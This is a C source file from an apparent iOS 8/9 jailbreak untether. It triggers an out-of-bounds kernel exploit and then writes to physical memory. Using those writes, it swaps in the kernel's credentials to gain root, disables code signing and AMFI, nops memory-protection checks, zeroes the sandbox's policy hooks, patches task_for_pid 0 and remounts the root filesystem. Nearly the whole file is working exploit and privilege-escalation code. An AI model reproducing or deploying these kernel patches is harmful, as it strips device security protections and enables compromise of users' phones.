#include <spawn.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/utsname.h>

#include <mach/mach.h>

#include "../IOKit/IOKitLib.h"

#include "../oob_entry/oob_entry.h"
#include "../oob_entry/memory.h"
#include "jailbreak.h"
#include "patchfinder.h"
#include "mac_policy_ops.h"

struct utsname u = { 0 };
static char *ckernv;

static bool isIOS9 = false;
static bool isA5 = false;

void patch_bootargs(uint32_t addr){
    //printf("set bootargs\n");
    uint32_t bootargs_addr = physread32(addr) + 0x38;
    const char* new_bootargs = "cs_enforcement_disable=1 amfi_get_out_of_my_way=1";

    // evasi0n6
    size_t new_bootargs_len = strlen(new_bootargs) + 1;
    size_t bootargs_buf_len = (new_bootargs_len + 3) / 4 * 4;
    char bootargs_buf[bootargs_buf_len];

    strlcpy(bootargs_buf, new_bootargs, bootargs_buf_len);
    memset(bootargs_buf + new_bootargs_len, 0, bootargs_buf_len - new_bootargs_len);
    physwrite_buf(bootargs_addr, bootargs_buf, bootargs_buf_len);
}

// debugger 1 and 2 for 9.x
uint32_t find_PE_i_can_has_debugger_1(void) {
    uint32_t PE_i_can_has_debugger_1;
    if (isA5) {
        if (strstr(ckernv, "3248.61")) {
            print_log("9.3.5-9.3.6\n");
            PE_i_can_has_debugger_1 = 0x3a82c4;
        } else if (strstr(ckernv, "3248.60")) {
            print_log("9.3.3-9.3.4\n");
            PE_i_can_has_debugger_1 = 0x3a82d4;
        } else if (strstr(ckernv, "3248.50")) {
            print_log("9.3.2\n");
            PE_i_can_has_debugger_1 = 0x3a7ff4;
        } else if (strstr(ckernv, "3248.41")) {
            print_log("9.3-9.3.1\n");
            PE_i_can_has_debugger_1 = 0x3a7ea4;
        } else if (strstr(ckernv, "3248.31")) {
            print_log("9.2.1\n");
            PE_i_can_has_debugger_1 = 0x3a1434;
        } else if (strstr(ckernv, "3248.21")) {
            print_log("9.2\n");
            PE_i_can_has_debugger_1 = 0x3a12c4;
        } else if (strstr(ckernv, "3248.10")) {
            print_log("9.1\n");
            PE_i_can_has_debugger_1 = 0x3aa734;
        } else {
            print_log("9.0-9.0.2\n");
            PE_i_can_has_debugger_1 = 0x3a8fc4;
        }
    } else {
        if (strstr(ckernv, "3248.61")) {
            print_log("9.3.5-9.3.6\n");
            PE_i_can_has_debugger_1 = 0x3afee4;
        } else if (strstr(ckernv, "3248.60")) {
            print_log("9.3.3-9.3.4\n");
            PE_i_can_has_debugger_1 = 0x3aff14;
        } else if (strstr(ckernv, "3248.50")) {
            print_log("9.3.2\n");
            PE_i_can_has_debugger_1 = 0x3afb14;
        } else if (strstr(ckernv, "3248.41")) {
            print_log("9.3-9.3.1\n");
            PE_i_can_has_debugger_1 = 0x3afaf4;
        } else if (strstr(ckernv, "3248.31")) {
            print_log("9.2.1\n");
            PE_i_can_has_debugger_1 = 0x3a8764;
        } else if (strstr(ckernv, "3248.21")) {
            print_log("9.2\n");
            PE_i_can_has_debugger_1 = 0x3a85e4;
        } else if (strstr(ckernv, "3248.10")) {
            print_log("9.1\n");
            PE_i_can_has_debugger_1 = 0x3b0694;
        } else {
            print_log("9.0-9.0.2\n");
            PE_i_can_has_debugger_1 = 0x3af014;
        }
    }
    return PE_i_can_has_debugger_1;
}

uint32_t find_PE_i_can_has_debugger_2(void) {
    uint32_t PE_i_can_has_debugger_2;
    if (isA5) {
        if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
            print_log("9.3.x\n");
            PE_i_can_has_debugger_2 = 0x456070;
        } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
            print_log("9.2-9.2.1\n");
            PE_i_can_has_debugger_2 = 0x44f070;
        } else if (strstr(ckernv, "3248.10")) {
            print_log("9.1\n");
            PE_i_can_has_debugger_2 = 0x457860;
        } else {
            print_log("9.0-9.0.2\n");
            PE_i_can_has_debugger_2 = 0x4567d0;
        }
    } else {
        if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
            print_log("9.3.x\n");
            PE_i_can_has_debugger_2 = 0x45e1a0;
        } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
            print_log("9.2-9.2.1\n");
            PE_i_can_has_debugger_2 = 0x456190;
        } else if (strstr(ckernv, "3248.10")) {
            print_log("9.1\n");
            PE_i_can_has_debugger_2 = 0x45e980;
        } else {
            print_log("9.0-9.0.2\n");
            PE_i_can_has_debugger_2 = 0x45c8f0;
        }
    }
    return PE_i_can_has_debugger_2;
}

uint32_t find_patch_offset(uint32_t (*func)(uint32_t, uint8_t *, size_t), uint8_t* kdata, size_t ksize) {
    uint32_t addr = func(kinfo->kernel_base, kdata, ksize);
    if (addr <= 0xffff) return 0;
    if ((addr & 0x80000000) == 0x80000000) return addr;
    return addr + 0x80001000;
}

void unjail8(void){
    print_log("[*] jailbreaking...\n");

    print_log("[*] running kdumper\n");

    size_t ksize = 0xFFE000;
    void *kdata = calloc(1, ksize);
    physread_buf(0x80001000, kdata, ksize);

    /* patchfinder */
    print_log("[*] running patchfinder\n");
    uint32_t proc_enforce = find_patch_offset(find_proc_enforce, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = find_patch_offset(find_cs_enforcement_disable_amfi, kdata, ksize);
    uint32_t PE_i_can_has_debugger_1 = find_patch_offset(find_i_can_has_debugger_1, kdata, ksize);
    uint32_t PE_i_can_has_debugger_2 = find_patch_offset(find_i_can_has_debugger_2, kdata, ksize);
    uint32_t p_bootargs = find_patch_offset(find_p_bootargs, kdata, ksize);
    uint32_t vm_fault_enter = find_patch_offset(find_vm_fault_enter_patch_84, kdata, ksize);
    uint32_t vm_map_enter = find_patch_offset(find_vm_map_enter_patch, kdata, ksize);
    uint32_t vm_map_protect = find_patch_offset(find_vm_map_protect_patch_84, kdata, ksize);
    uint32_t mount_patch = find_patch_offset(find_mount_84, kdata, ksize) + 1;
    uint32_t mapForIO = find_patch_offset(find_mapForIO, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = find_patch_offset(find_sandbox_call_i_can_has_debugger, kdata, ksize);
    uint32_t csops_addr = find_patch_offset(find_csops, kdata, ksize);
    uint32_t csops2_addr = find_patch_offset(find_csops2, kdata, ksize);

    print_log("[PF] proc_enforce:               %08x\n", proc_enforce);
    print_log("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
    print_log("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
    print_log("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
    print_log("[PF] p_bootargs:                 %08x\n", p_bootargs);
    print_log("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
    print_log("[PF] vm_map_enter:               %08x\n", vm_map_enter);
    print_log("[PF] vm_map_protect:             %08x\n", vm_map_protect);
    print_log("[PF] mount_patch:                %08x\n", mount_patch);
    print_log("[PF] mapForIO:                   %08x\n", mapForIO);
    print_log("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
    print_log("[PF] csops:                      %08x\n", csops_addr);
    print_log("[PF] csops2:                     %08x\n", csops2_addr);

    print_log("[*] running kernelpatcher\n");

    /* proc_enforce: -> 0 */
    print_log("[*] proc_enforce\n");
    physwrite32(proc_enforce, 0);

    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
    print_log("[*] cs_enforcement_disable_amfi\n");
    physwrite8(cs_enforcement_disable_amfi, 1);
    physwrite8(cs_enforcement_disable_amfi-4, 1);

    /* debug_enabled -> 1 */
    print_log("[*] debug_enabled\n");
    physwrite32(PE_i_can_has_debugger_1, 1);
    physwrite32(PE_i_can_has_debugger_2, 1);

    /* bootArgs */
    print_log("[*] bootargs\n");
    patch_bootargs(p_bootargs);

    /* vm_fault_enter */
    print_log("[*] vm_fault_enter\n");
    physwrite32(vm_fault_enter, 0x2201bf00);

    /* vm_map_enter */
    print_log("[*] vm_map_enter\n");
    physwrite32(vm_map_enter, 0x4280bf00);

    /* vm_map_protect: set NOP */
    print_log("[*] vm_map_protect\n");
    physwrite32(vm_map_protect, 0xbf00bf00);

    /* mount patch */
    print_log("[*] mount patch\n");
    physwrite8(mount_patch, 0xe0);

    /* mapForIO: prevent kIOReturnLockedWrite error */
    print_log("[*] mapForIO\n");
    physwrite32(mapForIO, 0xbf00bf00);

    /* csops */
    print_log("[*] csops\n");
    physwrite32(csops_addr, 0xbf00bf00);
    physwrite8(csops2_addr, 0x20);

    /* sandbox */
    print_log("[*] sandbox\n");
    physwrite32(sandbox_call_i_can_has_debugger, 0xbf00bf00);

    uint32_t sbopsoffset = find_patch_offset(find_sandbox_mac_policy_ops, kdata, ksize);

    print_log("nuking sandbox\n");
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
    print_log("nuked sandbox\n");

    print_log("[*] patch tfp0\n");
    uint32_t tfp0_patch = find_patch_offset(find_tfp0_patch, kdata, ksize);
    print_log("[PF] tfp0_patch: %08x\n", tfp0_patch);
    physwrite32(tfp0_patch, 0xbf00bf00);

    print_log("enable patched.\n");
}

void unjail9(void){
    print_log("[*] jailbreaking...\n");

    print_log("[*] running kdumper\n");
    size_t ksize = 0xFFE000;
    void *kdata = calloc(1, ksize);
    physread_buf(0x80001000, kdata, ksize);

    /* patchfinder */
    print_log("[*] running patchfinder\n");
    uint32_t proc_enforce = find_patch_offset(find_proc_enforce, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = find_patch_offset(find_cs_enforcement_disable_amfi, kdata, ksize);
    uint32_t p_bootargs = find_patch_offset(find_p_bootargs_generic, kdata, ksize);
    uint32_t vm_fault_enter = find_patch_offset(find_vm_fault_enter_patch, kdata, ksize);
    uint32_t vm_map_enter = find_patch_offset(find_vm_map_enter_patch, kdata, ksize);
    uint32_t vm_map_protect = find_patch_offset(find_vm_map_protect_patch, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = find_patch_offset(find_sandbox_call_i_can_has_debugger, kdata, ksize);
    uint32_t csops_addr = find_patch_offset(find_csops, kdata, ksize);
    uint32_t amfi_file_check_mmap = find_patch_offset(find_amfi_file_check_mmap, kdata, ksize);
    uint32_t PE_i_can_has_debugger_1 = 0x80001000 + find_PE_i_can_has_debugger_1();
    uint32_t PE_i_can_has_debugger_2 = 0x80001000 + find_PE_i_can_has_debugger_2();
    uint32_t mount_patch;
    uint32_t mapForIO;
    uint32_t i_can_has_kernel_configuration_got;
    uint32_t lwvm_jump;

    if (strstr(ckernv, "3248.1.")) {
        mount_patch = find_patch_offset(find_mount_90, kdata, ksize);
    } else {
        mount_patch = find_patch_offset(find_mount, kdata, ksize);
    }

    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
        i_can_has_kernel_configuration_got = find_patch_offset(find_PE_i_can_has_kernel_configuration_got, kdata, ksize);
        lwvm_jump = find_patch_offset(find_lwvm_jump, kdata, ksize);
        print_log("[PF] i_can_has_kernel_configuration_got: %08x\n", i_can_has_kernel_configuration_got);
        print_log("[PF] lwvm_jump:                  %08x\n", lwvm_jump);
    } else {
        mapForIO = find_patch_offset(find_mapForIO, kdata, ksize);
        print_log("[PF] mapForIO:                   %08x\n", mapForIO);
    }

    print_log("[PF] proc_enforce:               %08x\n", proc_enforce);
    print_log("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
    print_log("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
    print_log("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
    print_log("[PF] p_bootargs:                 %08x\n", p_bootargs);
    print_log("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
    print_log("[PF] vm_map_enter:               %08x\n", vm_map_enter);
    print_log("[PF] vm_map_protect:             %08x\n", vm_map_protect);
    print_log("[PF] mount_patch:                %08x\n", mount_patch);
    print_log("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
    print_log("[PF] csops:                      %08x\n", csops_addr);
    print_log("[PF] amfi_file_check_mmap:       %08x\n", amfi_file_check_mmap);

    print_log("[*] running kernelpatcher\n");

    /* proc_enforce: -> 0 */
    print_log("[*] proc_enforce\n");
    physwrite32(proc_enforce, 0);

    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
    print_log("[*] cs_enforcement_disable_amfi\n");
    physwrite8(cs_enforcement_disable_amfi, 1);
    physwrite8(cs_enforcement_disable_amfi-1, 1);

    /* bootArgs */
    print_log("[*] bootargs\n");
    patch_bootargs(p_bootargs);

    /* debug_enabled -> 1 */
    print_log("[*] debug_enabled\n");
    physwrite32(PE_i_can_has_debugger_1, 1);
    physwrite32(PE_i_can_has_debugger_2, 1);

    /* vm_fault_enter */
    print_log("[*] vm_fault_enter\n");
    physwrite16(vm_fault_enter, 0x2201);

    /* vm_map_enter */
    print_log("[*] vm_map_enter\n");
    physwrite32(vm_map_enter, 0xbf00bf00);

    /* vm_map_protect: set NOP */
    print_log("[*] vm_map_protect\n");
    physwrite32(vm_map_protect, 0xbf00bf00);

    /* mount patch */
    print_log("[*] mount patch\n");
    if (strstr(ckernv, "3248.1.")) {
        physwrite8(mount_patch, 0xe7);
    } else {
        physwrite8(mount_patch, 0xe0);
    }

    /* mapForIO: prevent kIOReturnLockedWrite error */
    print_log("[*] mapForIO\n");
    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
        physwrite32(i_can_has_kernel_configuration_got, lwvm_jump);
    } else {
        physwrite32(mapForIO, 0xbf00bf00);
    }

    /* csops */
    print_log("[*] csops\n");
    physwrite32(csops_addr, 0xbf00bf00);

    /* amfi_file_check_mmap */
    print_log("[*] amfi_file_check_mmap\n");
    physwrite32(amfi_file_check_mmap, 0xbf00bf00);

    /* sandbox */
    print_log("[*] sandbox\n");
    physwrite32(sandbox_call_i_can_has_debugger, 0xbf00bf00);

    uint32_t sbopsoffset = find_patch_offset(find_sandbox_mac_policy_ops, kdata, ksize);

    print_log("nuking sandbox\n");
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
    physwrite32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
    print_log("nuked sandbox\n");

    print_log("[*] patch tfp0\n");
    uint32_t tfp0_patch = find_patch_offset(find_tfp0_patch, kdata, ksize);
    print_log("[PF] tfp0_patch: %08x\n", tfp0_patch);
    physwrite32(tfp0_patch, 0xbf00bf00);

    print_log("enable patched.\n");
}

void jailbreak_init(void) {
    uname(&u);
    ckernv = strdup(u.version);
    print_log("kern.version: %s\n", ckernv);

    if (strstr(ckernv, "3248") || strstr(ckernv, "3247")) {
        print_log("isIOS9? yes\n");
        isIOS9 = true;
    }

    if (strstr(ckernv, "S5L894")) {
        print_log("isA5? yes\n");
        isA5 = true;
    }
}

#ifdef UNTETHER
void load_jb(void){
    // remount rootfs
    print_log("[*] remounting rootfs\n");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    print_log("remount = %d\n",mntr);

    const char *jl;
    pid_t pd = 0;

    int f = open("/.installed_daibutsu", O_RDONLY);
    if (f == -1) {
        chmod("/private", 0777);
        chmod("/private/var", 0777);
        chmod("/private/var/mobile", 0777);
        chmod("/private/var/mobile/Library", 0777);
        chmod("/private/var/mobile/Library/Preferences", 0777);

        posix_spawn(&pd, "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", 0, 0, (char**)&(const char*[]){"/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", NULL}, NULL);
        print_log("[*] pid = %x\n", pd);
        waitpid(pd, 0, 0);
        sleep(3);

        open("/.installed_daibutsu", O_RDWR|O_CREAT);
        chmod("/.installed_daibutsu", 0644);
        chown("/.installed_daibutsu", 0, 0);
    }

    print_log("[*] loading JB\n");
    // substrate: run "dirhelper"
    jl = "/bin/bash";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "/usr/libexec/dirhelper", NULL }, NULL);
    waitpid(pd, NULL, 0);

    usleep(10000);

    // looks like this doesnt work with jsc untether, will use daemonloader instead, launched by dirhelper above
    jl = "/bin/launchctl";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/LaunchDaemons", NULL }, NULL);
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/NanoLaunchDaemons", NULL }, NULL);

    usleep(10000);
}

void failed(void){
    print_log("[-] failed to execute untether. rebooting.\n");
    //sleep(5);
    reboot(0);
}

int main(void){
    jailbreak_init();

    if(run_oob_entry(false) != 0){
        print_log("[-] exploit failed\n");
        failed();
        return -1;
    }

    uint32_t self_ucred = 0;
    uint8_t proc_ucred = 0x8c;
    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
        proc_ucred = 0xa4;
    } else if (strstr(ckernv, "3248.3") || strstr(ckernv, "3248.2") || strstr(ckernv, "3248.10")) {
        proc_ucred = 0x98;
    }
    if (getuid() != 0 || getgid() != 0) {
        print_log("[*] Set uid to 0 (proc_ucred: %x)...\n", proc_ucred);
        uint32_t kern_ucred = physread32(kinfo->kern_proc_addr + proc_ucred);
        self_ucred = physread32(kinfo->self_proc_addr + proc_ucred);
        physwrite32(kinfo->self_proc_addr + proc_ucred, kern_ucred);
        setuid(0);
        setgid(0);
    }
    if (getuid() != 0 || getgid() != 0) return -1;

    if(!isIOS9){
        unjail8();
    } else {
        unjail9();
    }
    load_jb();

    print_log("[*] DONE!\n");

    return 0;
}
#endif
